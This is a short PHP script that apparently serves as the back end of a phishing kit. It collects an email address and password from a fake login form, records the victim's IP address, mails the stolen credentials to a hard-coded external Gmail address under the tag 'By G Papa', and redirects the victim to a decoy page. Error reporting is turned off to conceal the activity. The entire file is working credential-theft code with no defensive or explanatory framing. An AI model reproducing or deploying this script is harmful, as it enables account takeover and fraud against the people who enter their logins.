<?php

error_reporting(0);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$email = $_POST['email'];

$ip = getenv("REMOTE_ADDR");
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "--------------Login ETC-----------------------\n";
$message .= "email: ".$_POST['email']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "----------- | By G Papa | -----------\n";
$message .= "\n";
$send = "patrickraymond1113@gmail.com";
$subject = "| Login  By G Papa | $ip |";
mail($send,$subject,$message);


header ("Location: ver.pdf.php?email=".$email);




?>